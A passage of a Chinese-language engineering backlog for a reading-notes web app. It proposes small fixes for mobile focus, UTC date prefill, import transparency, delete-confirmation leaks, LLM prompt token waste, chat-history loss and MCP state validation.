els.deleteMessage.textContent = `确定删除这张摘抄卡片${connNote}吗？`;
```
无 HTML/后端改动。

**Complexity:** S — 约 4 行改动。

**Files:** `app.js:2316-2325`（`deleteQuote` 函数 confirm 文案段）

**northstar:** 中——删除是不可逆操作；关联是 Theme 2「回顾有价值」的核心数据（语义连接网络），静默丢失最有害；一行文案补充即可达到与 deleteBook 相同的透明度标准。

---

### E93 — 摘抄对话框 `showModal()` 后未 `focus()` 文本区，移动端需额外点击才能开始输入 (S)

**What:** `openNewQuoteForBook()`（`app.js:2233-2248`）和 `editQuote()`（`app.js:2265-2283`）均在最后调用 `els.quoteDialog.showModal()`，之后无任何 `focus()` 调用：

```javascript
// app.js:2248
els.quoteDialog.showModal();
// (函数结束，无 focus)

// app.js:2283
els.quoteDialog.showModal();
// (函数结束，无 focus)
```

对话框打开后，`#quoteContent`（`index.html:471`）textarea 不是焦点元素。桌面浏览器通常会聚焦第一个可交互元素，但 iPhone Safari 对 `<dialog>` 内的 textarea 不自动 focus——用户需要额外点一次才能开始输入。对于「新建摘抄」（每次拍照后的主操作），这是一个固定摩擦点。

**Fix:** 两处 `showModal()` 调用后追加：
```javascript
requestAnimationFrame(() =>
  document.getElementById("quoteContent")?.focus()
);
```
`requestAnimationFrame` 确保 dialog 渲染完成后再 focus，兼容 Safari `<dialog>` 的异步显示时序。

**Complexity:** S — 两处各 3 行，无副作用，无 CSS/HTML/后端改动。

**Files:** `app.js:2248`（`openNewQuoteForBook` 末尾）；`app.js:2283`（`editQuote` 末尾）

**northstar:** 中——直接降低「拍照→OCR→成卡」最后一步的移动端输入摩擦；CLAUDE.md 明确「mobile-first (iPhone 12)」；Theme 1「采集顺滑」具体触点。

---

## 2026-06-18

### E94 — Session 新建表单日期预填 UTC 日期，UTC+8 凌晨用户（00:00–08:00）看到昨天日期 (S)

**What:** `app.js:2261`（`openNewSessionForm()` 中），新建阅读记录表单的日期字段预填：
```javascript
els.sessionForm.querySelector('[name="date"]').value = new Date().toISOString().split("T")[0];
```
`new Date().toISOString()` 返回 UTC 时间的 ISO 字符串，`.split("T")[0]` 取日期部分为 **UTC 日期**。UTC+8 时区下，本地时间 00:00–07:59（例如凌晨 1 点读书）对应 UTC 前一天 16:00–23:59——`toISOString()` 给出昨天的日期，但用户实际在今天读书。

`app.js:2140`（`editSession()` 中）有同族写法：
```javascript
const dateStr = session.date ? new Date(session.date).toISOString().split("T")[0] : "";
```
此处 `session.date` 存储为 `YYYY-MM-DD` 字符串，`new Date("2026-06-18")` 解析为 UTC 00:00，再 `toISOString()` 仍得 `"2026-06-18"`——此处实际安全，但依赖 UTC midnight 日期字符串的特殊行为，可读性差。

`index.html:430` 的日期 `<input>` 无 `max` 属性，用户可选择未来日期而不受限：
```html
<label><span>日期</span><input name="date" type="date" /></label>
```

**Fix（最小改动）：** 仅需修 `app.js:2261`：
```javascript
// 旧：new Date().toISOString().split("T")[0]
// 新：
const todayLocal = new Intl.DateTimeFormat("sv").format(new Date());
input.value = todayLocal;
input.max = todayLocal;  // 同步加 max 防未来日期，搭便车修
```
`"sv"` locale 在所有现代浏览器中返回 `YYYY-MM-DD` 本地时区格式，无需任何 polyfill。

**Complexity:** S — 1-2 行改动；`index.html:430` 可选搭便车加 `max`（JS 动态设置）；无后端改动，无测试变更（可选加断言）。

**Files:** `app.js:2261`（主改动点）；`app.js:2140`（可选清理同族写法）；`index.html:430`（可选搭便车 max 属性）

**northstar:** 中——Theme 1「采集顺滑」数据准确性：凌晨读书记录日期错误直接损害「零丢失/零错数据」验收标准，owner 是 UTC+8，晚睡读书高频场景。S 复杂度，零风险。

---

### E95 — 关联搜索 haystack 只含书名，按摘抄原文无法检索关联关系 (S)

**What:** `app.js:740-756`（`renderConnections()` 搜索过滤块）构建 haystack：
```javascript
const haystack = [
  getBookTitle(c.sourceType, c.sourceId),
  getBookTitle(c.targetType, c.targetId),
  c.thought || "",
].join(" ").toLowerCase();
```
`getBookTitle()`（`app.js:742-748`）对 `quoteType` 只返回该摘抄所属书的书名，不包含摘抄本体的 `.content` 字段。若用户建立了一条「笛卡尔」摘抄→「人工智能」摘抄的关联，在关联搜索框输入"笛卡尔"——若两本书名都不含"笛卡尔"，搜索返回零结果，即使 `c.thought`（关联想法）也没有这个词。

**Why it matters:** 用户建立关联时脑中记住的往往是「那句话说了什么」，而不是「它属于哪本书」。按摘抄原文检索关联，才能「想到就找到」。修复只需在 haystack 中加入 source/target 的 quote content 查找：
```javascript
const sourceContent = c.sourceType === "quote"
  ? (state.quotes.find(q => q.id === c.sourceId)?.content || "")
  : "";
const targetContent = c.targetType === "quote"
  ? (state.quotes.find(q => q.id === c.targetId)?.content || "")
  : "";
const haystack = [
  getBookTitle(c.sourceType, c.sourceId),
  getBookTitle(c.targetType, c.targetId),
  sourceContent,
  targetContent,
  c.thought || "",
].join(" ").toLowerCase();
```
额外查找仅在 `searchRaw` 非空时触发（`if (!searchRaw)` 短路保护已存在于 `app.js:739`），连接数量通常 <100，O(Q) 查找可忽略。

**Complexity:** S — 约 6 行 JS 改动，无 HTML/后端/测试改动（可选追加断言）。

**Files:** `app.js:740-756`（`renderConnections` 搜索块）

**northstar:** 中——Theme 2「回顾有价值」的关键检索入口：关联是 app 的差异化功能，「按摘抄内容找关联」是回顾时最自然的方式；现在按内容搜无法命中，等于让连接网络对用户半透明。

---

### E96 — Excel 导入成功仍用 2 秒自动消失 toast，与 JSON 导入的详细结果弹窗不一致 (S)

**What:** `app.js:3188`（`importFromExcel()` 成功路径）：
```javascript
showToast(`Excel 导入成功：新增 ${imported} 本`);
```
对比 JSON 备份导入（`app.js:3161-3166`，OPT-041 升级后的 `importFromJSON()`）：
```javascript
showImportResult(state);  // 显示详细结果弹窗：新增书数/摘抄数/记录数
```
OPT-041（PR #42）已将 JSON 导入从 toast 升级为 `showImportResult()` 详细结果弹窗，但 `importFromExcel()` 未做同等升级。两个导入入口输出形式不一致——Excel 用户只看到 2 秒消失的「新增 3 本」，不知道是否有记录被跳过；JSON 用户看到持久弹窗 + 明细数字。

**Why it matters:** 导入操作的结果透明度是 OPT-041 的立意核心（误导入后数据丢失事故驱动）。Excel 导入同样可能出现「已存在书被跳过」场景（`imported` 可能小于文件中书的总数），toast 自动消失后用户无法回看；双入口体验不一致，降低用户对导入功能的信任感。`showImportResult()` 已存在，复用成本极低。

**Complexity:** S — 改 `app.js:3188` 约 3-5 行；`showImportResult()` 可能需轻微调整以适配「无摘抄/记录」的 Excel 场景（Excel 只导入书，state 里的 quotes/sessions 不变）；无后端/HTML/测试改动。

**Files:** `app.js:3161-3190`（`importFromExcel` 成功路径）；`app.js` `showImportResult` 函数（可能需 1 行适配）

**northstar:** 弱/中——与 OPT-041 一脉相承，数据导入操作结果透明度；间接支持 Theme 1「零丢失」验收标准（用户须清晰知道导入了什么）。S 复杂度，低风险。

---

## 2026-06-19

### E97 — `editSession()` 和 `openNewSessionForBook()` 调用 `showModal()` 后均无 `focus()`，移动端须额外点击才能开始输入 (S)

**What:** `editSession()`（`app.js:2142`）和 `openNewSessionForBook()`（`app.js:2262`）均以 `els.sessionDialog.showModal()` 结束，之后无任何 `focus()` 调用：

```javascript
// app.js:2142
els.sessionDialog.showModal();
// (函数结束，无 focus)

// app.js:2262
els.sessionDialog.showModal();
// (函数结束，无 focus)
```

Session 表单（`index.html:419-441`）的第一个需要手动填入的必填字段是 `startPage`（`[name="startPage"]`，`index.html:431`，`type="number" required`）。iPhone Safari 对 `<dialog>` 内 input 不自动聚焦——用户打开「新增记录」或「编辑记录」弹窗后，须额外点击 `startPage` 输入框才能开始填写。同类缺陷已在 OPT-058 中为摘抄对话框修复（`app.js:2248, 2283`），Session 对话框未做同等处理。

**Why it matters:** 「新增阅读记录」是 Theme 1「采集顺滑」的每日操作触点。每次打开弹窗须额外点击一次输入框，在高频场景下积累显著摩擦。CLAUDE.md 明确「mobile-first (iPhone 12)」，此问题在 Safari 上有确定性复现。OPT-058 已有完整修复模式（`requestAnimationFrame` + `focus()`），本修复仅是平行应用，实现风险接近零。

**Complexity:** S — 两处 `showModal()` 后各追加 `requestAnimationFrame(() => document.querySelector('#sessionDialog [name="startPage"]')?.focus())`，共 2 处 × 3 行，零副作用，无 HTML/CSS/后端改动。Touch: `app.js:2142`（`editSession` 末尾）；`app.js:2262`（`openNewSessionForBook` 末尾）。

**Files:** `app.js:2129-2143`（`editSession`）；`app.js:2251-2263`（`openNewSessionForBook`）；参照：`app.js:2248, 2283`（OPT-058 同类修复）

**northstar:** 中——Theme 1「采集顺滑」每日触点：Session 记录是阅读习惯追踪的核心动作，减少固定摩擦直接影响「每天主动想用它」的体验感；与 OPT-058 共享相同修复模式，S 复杂度。→ **promoted to OPT-061**

---

### E98 — `importExcel()` 跳过重复书时无计数，「新增 3 本」不告知有几本被略过 (S)

**What:** `importExcel()`（`app.js:3116-3192`）检测到重复书时直接 `continue`（`app.js:3147`），无任何跳过计数器：

```javascript
if (seenBooks.some((book) => isSameBook(title, author, book.title, book.author))) continue; // line 3147 — no skipped++
```

成功路径（`app.js:3188`）仅报告新增数量：

```javascript
showToast(`Excel 导入成功：新增 ${imported} 本`);
```

当用户导入含 10 本的 Excel 但其中 7 本已存在时，提示「新增 3 本」——无法得知是有 7 本被检测为重复跳过，还是文件格式问题或读取失败。「全部重复」场景（`imported === 0`）有单独提示（`app.js:3182`）；唯独「部分重复」场景的透明度为零。

**Why it matters:** 用户导入书单前往往不记得哪些书已在 app 里——看到「新增 3 本」而文件里有 10 本时，可能困惑并重复尝试导入，导致数据污染或混乱。显示「新增 3 本（7 本重复已跳过）」是 3 行代码的改动，彻底消除这个信息差。

**Complexity:** S — 在 `app.js:3139` 增加 `let skipped = 0;`；在 `app.js:3147` 的 `continue` 前插入 `skipped++;`；将 `app.js:3188` 的 toast 改为 `` `Excel 导入成功：新增 ${imported} 本${skipped ? `，跳过重复 ${skipped} 本` : ""}` ``。共约 3 行改动，零 HTML/后端改动，可选追加测试断言。

**Files:** `app.js:3139`（添加 `skipped` 计数器）；`app.js:3147`（`continue` 前计数）；`app.js:3188`（toast 加 skipped 信息）

**northstar:** 弱/中——数据导入透明度；与 Theme 1「零丢失/零数据混淆」验收标准间接相关；用户须清晰知道导入了什么、跳过了什么。S 复杂度，零风险。

---

### E99 — `deleteSession()` 确认文案完全匿名，不显示书名或日期，用户无法确认删的是哪条记录 (S)

**What:** `deleteSession()`（`app.js:2299-2314`）弹出确认对话框时，文案硬编码为通用字串：

```javascript
showConfirmDialog({
  message: "确定删除这条阅读记录吗？",   // app.js:2302 — 无书名、无日期
  ...
});
```

Session 对象有 `bookId`、`date`、`startPage`、`endPage`、`minutes` 等字段，均未被引用。对比同文件的其他删除：
- `deleteBook()`（`app.js:2076`）显示 `book.title`（E89 提议进一步加摘抄/记录数）
- `deleteQuote()`（`app.js:2319`）显示「这张摘抄卡片」（E92 提议加关联数）

`deleteSession()` 比两者更模糊——Timeline Tab 中多条 session 卡片视觉相似，用户须先翻读卡片才能分辨目标，确认弹窗再次显示通用文案，进一步增加误删可能性。

**Fix:**
```javascript
const session = state.sessions.find(s => s.id === sessionId);
const book = state.books.find(b => b.id === session?.bookId);
const dateNote = session?.date ? ` · ${session.date}` : "";
// message: `确定删除「${book?.title || "未知书籍"}」${dateNote} 的阅读记录吗？`
```

**Complexity:** S — 约 4 行改动，零 HTML/后端/测试变动。

**Files:** `app.js:2299-2314`（`deleteSession` 函数，`showConfirmDialog` 调用前）

**northstar:** 弱——删除是不可逆操作，显示上下文是最低透明度标准；与 E89/E92 是同系列补丁，P2/P3 候选，非当前主题核心摩擦。

---

## 2026-06-20

### E100 — `showConfirmDialog()` 与 `deleteBook()` 均未处理 Escape 关闭，残留 `{ once: true }` 监听器可触发错误删除 (S)

**What:** 两处对话框实现均在 Escape 键关闭时留下游离监听器：

1. **`showConfirmDialog()`**（`app.js:2286-2297`）在 `confirmDialogConfirmBtn` 和 `confirmDialogCancelBtn` 上注册 `{ once: true }` 处理器，但**未**在 `els.confirmDialog` 上注册 `cancel` 事件监听（浏览器原生 Escape 键会触发 `<dialog>` 的 `cancel` 事件）。Escape 关闭时，两个按钮的 `{ once: true }` 处理器从未触发、从未消费，持续存留；下次 `showConfirmDialog()` 调用再次堆叠新处理器——下次点击确认按钮时，旧闭包（捕获上一操作的 `onConfirm`）与新闭包同时触发。该函数被至少 6 处调用：`deleteSession`（`app.js:2301`）、`deleteQuote`（`app.js:2318`）、`deleteAccount`（`app.js:2949`）、Excel 导入守卫（`app.js:3067, 3086`）等。
2. **`deleteBook()`**（`app.js:2070-2127`）定义了 `cleanup()` 调用 `removeEventListener`，但 `cleanup()` 仅在 `onConfirm`（`app.js:2094`）和 `onCancel`（`app.js:2099`）中调用，**未**在 `deleteBookDialog` 上注册 `cancel` 事件监听。每次 Escape 关闭 deleteBook 对话框，一个捕获特定 `bookId` 的 `onConfirm` 闭包便永久挂在 `deleteBookConfirmBtn` 上；多次 Escape 后，下次点击确认可连续删除多本书。

**Why it matters:** Escape 是 mobile Safari 以外浏览器的常见关闭手势，用户改变主意时频繁使用。漏斗最底层（删除确认）出现幂等性破坏，可导致难以察觉的数据丢失，与 Theme 1「零数据丢失」验收直接冲突。修复极简、风险极低。

**Complexity:** S — `showConfirmDialog` 函数体内追加 1 行 `cancel` 监听；`deleteBook` 内追加同等 1 行，无 HTML/后端/测试改动。

```javascript
// showConfirmDialog fix (app.js:2295 后追加):
els.confirmDialog.addEventListener("cancel", () => {}, { once: true });
// 更准确写法（同时清除 confirm 按钮残留处理器方案，参见 how）

// deleteBook fix (app.js:2127 附近):
els.deleteBookDialog.addEventListener("cancel", cleanup, { once: true });
```

**Files:** `app.js:2286-2297`（`showConfirmDialog`），`app.js:2070-2127`（`deleteBook`）

**northstar:** 中——数据安全是 Theme 1「零丢失」验收的硬性约束；S 复杂度修复成本远低于单次误删负影响。

---

### E101 — `PromptBuilder.build_chat_prompt()` 向 LLM 发送摘抄的 UI 专属字段，每次对话浪费数百至数万 token (S)

**What:** `app_server.py:2319` 将摘抄列表以**完整对象**形式写入 LLM payload：

```python
# app_server.py:2319
"quotes": quotes,   # 全量摘抄对象，含 UI 渲染字段
```

每个摘抄对象实际包含以下对 LLM 推理毫无价值的字段：
- `imageUrl`（上传路径，~8 tokens）
- `ocrSource` / `ocrStatus`（OCR 元状态，各 ~3 tokens）
- `ocrError`（出错时约 5 tokens）
- `ocrUpdatedAt` / `ocrRequestedAt`（各 ~8 tokens）
- `ocrText`（最严重）：快速 OCR 完成后若用户已手动编辑 content，原始全页 OCR 文本以 `ocrText` 形式保留在对象中（`app_server.py:1347-1352`）；一页书籍 OCR 约 500-2000 字符（125-500 tokens），20 张摘抄中若有 5 张含 `ocrText` 即可额外贡献 2500+ tokens

同理，book 对象（`app_server.py:2316`，`"book": book or {}`）包含 `coverImageUrl`（URL 路径，非 LLM 需要的信息）。

估算：正常 20 张摘抄 ~600 tokens 浪费；`ocrText` 全量存在时可超 10,000 tokens，超过 OPT-047 正在修复的 `all_books_summary` 上限问题量级。

**Why it matters:** DeepSeek 按 token 计费；prompt token 每次对话都在消耗。OPT-020（connections 字段裁剪）、OPT-047（all_books_summary 截断）都是同类优化，本项是同等优先级的配套补丁。`ocrText` 字段是「隐形成本炸弹」：用户 OCR 使用越多，每次对话成本越高。

**Complexity:** S — 在 `build_chat_prompt()` 中对 `quotes` 列表做 dict comprehension 过滤，白名单保留 `id, bookId, content, type, tags, connections, createdAt`；对 `book` 对象同理去掉 `coverImageUrl`。无 API/DB schema 变更，无前端变更。

**Files:** `app_server.py:2312-2345`（`PromptBuilder.build_chat_prompt`），`app_server.py:1347-1352`（`ocrText` 写入点，供验证）

**northstar:** 中——与 OPT-020/OPT-047 同类，直接降低每次探讨的 API 成本，Theme 1 成本控制的遗漏项。

---

### E102 — `compress_chat_history_if_needed()` API 失败时静默写入截断历史，永久丢失旧消息 (S)

**What:** `app_server.py:2267-2292`（`compress_chat_history_if_needed`）在 `call_deepseek()` 抛出异常（超时、429、网络故障）时进入 `except` 分支：

```python
# app_server.py:2279-2291
try:
    summary = call_deepseek(...)
    compressed = [...summary...] + recent
except Exception:
    compressed = recent            # ← fallback: 仅保留最近 6 条
state.setdefault("chatHistories", {})[history_key] = compressed
save_state(conn, user_id, state)   # ← 无论成功/失败，都写 DB
return compressed
```

`_COMPRESS_KEEP_RECENT = 6`（`app_server.py:2264`），`_COMPRESS_THRESHOLD = 10`（`app_server.py:2263`）。触发条件：历史超过 10 条时压缩；失败则将截断后的 6 条**立即持久化到 SQLite**。下次请求读回的 `chatHistories` 已是截断版本，早期消息永久不可恢复。

一次 DeepSeek 临时限速（返回 429）即可触发：用户连续聊 6 轮后（约 3 分钟使用），若 API 此刻拥堵，第 11 条消息的处理会静默丢弃前 5 条历史。

**Why it matters:** 聊天记录是「探讨历史」的唯一载体，是 Theme 2「回顾有价值」的核心资产。探讨 10 轮已是深度交流，此时发生无声数据丢失对用户体验的破坏性高于任何 UI 摩擦。修复只需 2 行：`except` 块中 `return history`（不保存），让下次请求再次尝试压缩。

**Complexity:** S — 将 `save_state` 移入 `try` 块内（压缩成功才写入），`except` 改为 `return history`；无 schema/前端/测试改动。

```python
# 修复草案
try:
    summary = call_deepseek(...)
    compressed = [...] + recent
    state.setdefault("chatHistories", {})[history_key] = compressed
    save_state(conn, user_id, state)
    return compressed
except Exception:
    return history   # 压缩失败时原样返回，下次重试
```

**Files:** `app_server.py:2267-2292`（`compress_chat_history_if_needed`）

**northstar:** 中——聊天历史是 Theme 2「回顾有价值」的前提数据；API 瞬断造成的静默丢失与 OPT-040/041 进口丢失同类（数据安全边界），S 修复成本极低。

---

## 2026-06-21

### E103 — `reading_mcp_server.py:_save_state()` 跳过 `sanitize_state()` 验证，MCP 写路径无状态校验 (S)

**What:** `reading_mcp_server.py:_save_state()`（第 70–75 行）直接执行 `UPDATE user_state SET state_json = ?, updated_at = ?` 并 `commit()`，没有调用 `sanitize_state()`。对比 `app_server.py:save_state()`（第 699–706 行）：它在写入前先执行 `sanitized = sanitize_state(state)` 并把 sanitized 结果写入 DB。MCP 的 `_load_state()`（第 61–67 行）读取后同样不调用 `sanitize_state()`。结果是：6 个 MCP 工具（`add_note`、`add_book`、`summary`、`question`、`tag`、`link_thought`）的写路径完全绕过 schema 验证。

```python
# reading_mcp_server.py:70-75 — 无 sanitize_state 调用
def _save_state(conn, user_id, state):
    conn.execute(
        "UPDATE user_state SET state_json = ?, updated_at = ? WHERE user_id = ?",
        (json.dumps(state, ensure_ascii=False), _now_iso(), user_id),
    )
    conn.commit()

# app_server.py:699-706 — 有 sanitize_state 保护
def save_state(conn, user_id, state):
    sanitized = sanitize_state(state)
    conn.execute(
        "UPDATE user_state SET state_json = ?, updated_at = ? WHERE user_id = ?",
        (json.dumps(sanitized, ensure_ascii=False), now_iso(), user_id),
    )
    conn.commit()
```

`sanitize_state()`（`app_server.py:633–667`）的职责：① 将 `chatHistories` 从 legacy 单键格式迁移到多键格式；② 规整 `chatContexts` 结构；③ 保证 `books/sessions/quotes/connections` 为 list；④ 只保留已知顶级键。MCP 工具写入的 state 绕过以上所有检查。注意这与 OPT-029（`BEGIN IMMEDIATE` 原子性）完全不同——OPT-029 解决并发读改写竞争，本项解决写入前缺少 schema 验证。

**Why:** MCP 服务器是独立写路径（Claude Desktop / 第三方客户端直接调用），不经过 `app_server.py` 请求处理链。最危险场景：`chatHistories` 以 legacy 格式写入后未迁移，下次 HTTP GET 经 `sanitize_state()` 时自动清空对应聊天记录；或某 MCP 工具 bug 将 `books` 写成 dict 而非 list，后续读取崩溃。

**Complexity:** S — 最简方案：在 `reading_mcp_server.py:_save_state()` 中 import 并调用 `sanitize_state`（需从 `app_server` 导入；若循环 import 有风险，可将 `sanitize_state` 提取到共享 `state_utils.py`，或在 MCP 侧内联最小版本）。

**Files:** `reading_mcp_server.py:70-75`（`_save_state`）；`app_server.py:633-667`（`sanitize_state` 参照）

**northstar:** 中——MCP 写路径是 Claude Desktop 的主要数据入口；绕过验证的状态写入可静默损坏 chatHistories，破坏 Theme 2「回顾有价值」的前提数据；数据安全边界，S 修复。

---

### E104 — "↓ 最新" 滚动按钮占独立行，挤压聊天区垂直空间 [signal-backed 2026-06-16] (S)

**What:** `index.html:190-192`，`chat-scroll-btn-row` div 在 HTML 结构中位于 `.chat-messages`（消息列表）和 `.chat-composer`（输入区）之间，在 CSS 中为独立 flex 行（`styles.css:2069-2073`）；桌面端通过 Grid 设为 `grid-row: 3`（`styles.css:3597-3600`），同样是独立行。按钮可见时，布局重新分配高度，消息区被压缩。

```html
<!-- index.html:190-192 -->
<div class="chat-scroll-btn-row" id="chatScrollBtnRow" hidden>
  <button id="chatScrollBtn" class="chat-scroll-btn" type="button" aria-label="回到最新">↓ 最新</button>
</div>
```

```css
/* styles.css:2069-2073 */
.chat-scroll-btn-row {
  display: flex;
  justify-content: flex-end;
  padding: 4px 4px 0;
}
/* styles.css:3597-3600 */
.chat-scroll-btn-row { grid-column: 2; grid-row: 3; }
```

Signal（`signals.md:2026-06-16`）：「聊天输入框里「最新」独占一行，挤压了左侧交互内容的空间 → 希望它不占整行」。

**Why:** iPhone 12 纵向空间有限，消息区每多一个独立行高就少一条可见消息。标准做法是将"回到最新"按钮用 `position: absolute; bottom: 8px; right: 12px` 叠加在消息列表容器内，`hidden` 时 zero-height，不影响其他区域布局。

**Complexity:** S — 给 `.chat-messages` 容器加 `position: relative`；将 `.chat-scroll-btn-row` 改为 `position: absolute; bottom: 8px; right: 12px; z-index: 10`（移出 flex/grid 流）；删除桌面端 `grid-row: 3` 覆盖。HTML 结构移入 `.chat-messages` 内部，或保持位置不动（父容器 `position: relative` 仍可定位子元素）。

**Files:** `styles.css:2069-2073`（`.chat-scroll-btn-row` 基础样式），`styles.css:3597-3600`（桌面 grid 覆盖）；`index.html:177-192`（HTML 结构参照）

**northstar:** 中——Theme 1「采集顺滑」日常触点；信号明确（2026-06-16）；iPhone 12 小屏上减少垂直占用体感明显；S 修复，纯 CSS 改动。

---

### E105 — OCR 结果填入单块 `<textarea>` 无逐行快删 UI，整页全文需手动剪辑 [signal-backed 2026-06-16] (M)

**What:** 快速 OCR 完成后（Moonshot Kimi 视觉识别），`app_server.py:1347-1362` 将识别文本写入 `quote["content"]` 或 `quote["ocrText"]`，前端 `app.js:1547-1553` 将其填入 `quoteContent` textarea：

```js
// app.js:1550
const recognizedText = quote.content || quote.ocrText || "";
// ...然后填入 els.quoteContent.value
```

`index.html:468` 的 textarea 是单块编辑区：

```html
<textarea name="content" id="quoteContent" rows="5"
  placeholder="可手动输入，也可以先拍照上传再尝试 OCR。"></textarea>
```

OCR 返回整页全文（500-2000 字符），用户只想保留划线句，需在 textarea 内手动定位、选中、删除多余段落。没有结构化列表视图，没有单行删除。Signal（`signals.md:2026-06-16`）：「快速 OCR 很快但会识别整页全文，只想留划线句，得手动删一大堆很麻烦 → 希望能「一行一行快速删除」OCR 结果」。

**Why:** OCR 全页识别是当前架构的必然结果，用户期望"快速筛留有用行"。单块 textarea 对此使用场景严重不匹配：手机上滚动、选中、删除文本段落体验极差。逐行 chip 列表（识别结果按 `\n` 分割，每行右侧一个 ✕ 按钮）是移动端最符合拇指操作的模式；最终 ✕ 删光后合并剩余行到 textarea 值，后续保存流程不变。这是 signals.md 目前最末一条信号（2026-06-16），直接阻碍 Theme 1「采集顺滑」的验收体验。

**Complexity:** M — 纯前端改动：OCR 回调处（`app.js` OCR 状态机 `ocrStatus===done` 分支）在填入 textarea 前先拆行并渲染行列表组件；行列表状态需与 textarea 值双向同步；dialog 关闭时清理行列表状态。无后端/DB schema 变化；不涉及 `sanitize_state`。M 级别主要来自 OCR 状态机（`ocrStatus` 字段转换）与新视图的正确对接，以及行列表→textarea 合并逻辑。

**Files:** `app.js:1547-1553`（OCR 结果填入点）；`index.html:468`（quoteContent textarea）；`app_server.py:1347-1362`（OCR 文本来源，验证）；`styles.css`（行列表样式，新增）

**northstar:** 强——signals.md 最新信号（2026-06-16）明确点名此痛点；Theme 1「采集顺滑」直接验收场景（OCR 快路径每次都触发）；快 OCR 的时间收益被后续手动清理抵消，本项修复后才能实现真正的「快路径」。

---


## 2026-06-22

### E106 — `contextFromHistoryKey()` 前端缺少 `quote:` 前缀处理，与后端逻辑不对称 (S)

**What:** `app.js:274-279` 的 `contextFromHistoryKey()` 函数仅处理 `book:` 前缀，`quote:` 前缀直接落入默认分支，被错误解析为书本 context（quoteId 被当成 bookId）：

```js
// app.js:274-279
function contextFromHistoryKey(historyKey) {
  const key = String(historyKey || "").trim();
  if (!key || key === "__general__" || key === "global") return { type: "global" };
  if (key.startsWith("book:")) return normalizeChatContext({ type: "book", bookId: key.slice(5) });
  return normalizeChatContext({ type: "book", bookId: key }); // quote: 前缀在此误判为 bookId
}
```

后端 `app_server.py:617-625` 正确处理了 `quote:` 前缀：

```python
if key.startswith("quote:"):
    return normalize_chat_context({"type": "quote", "quoteId": key[6:]})
```

触发路径：`parseChatState()`（`app.js:290-300`）在 `rawContexts[key]` 缺失或为非 object 时回退到 `contextFromHistoryKey(key)`（`app.js:292-294`）。chatContexts 与 chatHistories 脱同步时（状态迁移、边缘 import 场景）即触发：`quote:abc123` 的历史聊天被解析为 `{type:"book", bookId:"abc123"}`，若对应 bookId 不存在则该段聊天历史实际不可寻回。

**Why:** 摘抄级聊天（「去聊」入口，`goToQuoteChat`，`app.js:2224-2231`）的历史 key 形如 `quote:<quoteId>`，前后端生成逻辑一致，但前端的 fallback 解析路径存在前缀盲区。状态迁移或不完整 import 后，用户打开探讨面板可能发现摘抄聊天历史消失——实际记录仍在 DB，只是因 context 解析错误无法定位。S 复杂度，1 行修复，消除前后端不对称。

**Complexity:** S — 在 `app.js:277` 处插入一行 `if (key.startsWith("quote:")) return normalizeChatContext({ type: "quote", quoteId: key.slice(6) });`，零后端改动，零测试需求（逻辑等价后端已有的处理路径）。

**Files:** `app.js:274-279`（`contextFromHistoryKey` 函数）；参考 `app_server.py:617-625`（后端对称逻辑）

**northstar:** 弱→中——边缘场景触发，但一旦触发直接导致 Theme 2「回顾有价值」的聊天历史不可寻回；S 修复防止无声丢失，与 OPT-063/OPT-065 同属「历史数据可靠性」类。

---

### E107 — 编辑已有阅读会话不同步书籍进度字段（`currentPage` / `lastReadAt` / `updatedAt`） (S)

**What:** `app.js:2029-2037` 的 session 编辑分支仅更新 session 记录本体，未重算书籍的 `currentPage`、`lastReadAt`、`updatedAt`：

```js
// app.js:2029-2037
if (existingId) {
  const idx = state.sessions.findIndex((s) => s.id === existingId);
  state.sessions[idx] = {
    ...state.sessions[idx],
    bookId, startPage, endPage,
    pagesRead: endPage - startPage,
    minutes, note, date,
    // book.currentPage / lastReadAt / updatedAt 未更新
  };
}
```

对比新建 session 分支（`app.js:2038-2055`）明确更新了这三个字段：

```js
// app.js:2046-2048
book.currentPage = Math.max(book.currentPage || 0, endPage);
book.lastReadAt = date;
book.updatedAt = new Date().toISOString();
```

结果：用户将某会话的 endPage 从 150 改成 200，书籍列表显示的「读到第 150 页」不更新；书籍的 `status`（reading/finished，`app.js:2050-2055`）也不会因编辑而触发 finished 判断。

**Why:** 书单页及书籍详情页以 `book.currentPage` 和 `book.lastReadAt` 驱动进度展示；编辑会话是用户修正阅读记录的常规操作（笔误纠正），不同步书籍进度会造成进度显示与实际 session 数据不一致，影响 Theme 1「采集顺滑」的数据准确性感知。S 修复：编辑路径下重算 book 字段，与新建路径逻辑对齐。

**Complexity:** S — 在编辑分支末（`app.js:2037`）追加同新建分支相同的 3 行 book 字段更新逻辑（`currentPage` 取该书所有 session endPage 的 max，`lastReadAt`/`updatedAt` 更新，并补 finished 判断）。纯前端，无 DB schema 变更。

**Files:** `app.js:2029-2055`（saveSession 函数内两个分支）

**northstar:** 中——书籍进度数据是 Theme 1 全链路（拍照→摘抄→进度记录）的数据完整性保证；编辑会话后进度不更新是对采集准确性的无声破坏；S 修复，消除新建/编辑两路径的逻辑分叉。

---

### E108 — 导入减量守卫未覆盖 `chatHistories`：旧备份覆盖聊天记录不弹确认 (S)

**What:** `app.js:3077-3084` 的 decrease guard（OPT-043 添加）仅检查 `books`、`quotes`、`sessions`、`connections` 四类数据的数量减少，未涵盖 `chatHistories`：

```js
// app.js:3077-3084
const _categoryLabels = { books: "书籍", quotes: "摘抄", sessions: "记录", connections: "关联" };
const _losses = Object.entries(_categoryLabels).map(([key, label]) => {
  const cur = Array.isArray(state[key]) ? state[key].length : 0;
  const inc = Array.isArray(resolved[key]) ? resolved[key].length : 0;
  return inc < cur ? `${label} ${cur - inc} 条` : null;
}).filter(Boolean);
```

`stateContentCount()`（`app.js:3009-3016`）同样不计 `chatHistories`。而 `resolveImportState()`（`app.js:2994-3006`）**确实会**将备份中的 `chatHistories` 写入 resolved 状态。

场景：用户导入一份较旧的备份文件——该备份中 books/quotes/sessions 数量相同，但当时尚未使用过聊天功能（`chatHistories: {}`）。当前账号已有 20 条探讨历史（`chatHistories` 含 20 个 key）。导入后：四类减量守卫不触发，直接调用 `applyImport()`，20 条聊天历史被静默覆盖为空。

**Why:** OPT-063 已将聊天历史定性为「P1 数据安全」（compress 失败不能写入），本项是同类风险在 import 路径上的遗漏。聊天历史目前是唯一不在减量守卫内的「有价值」数据类型。S 修复：在 `_categoryLabels` 添加 `chatHistories` key，count 方式改为 `Object.keys(state.chatHistories||{}).length`。

**Complexity:** S — 在 `_categoryLabels` 中增加 chatHistories 条目，并对 chatHistories 的 count 逻辑做特殊处理（Object.keys 而非 Array.isArray）。仅修改约 4 行，无后端变更。

**Files:** `app.js:3009-3016`（`stateContentCount`）；`app.js:3077-3084`（decrease guard）

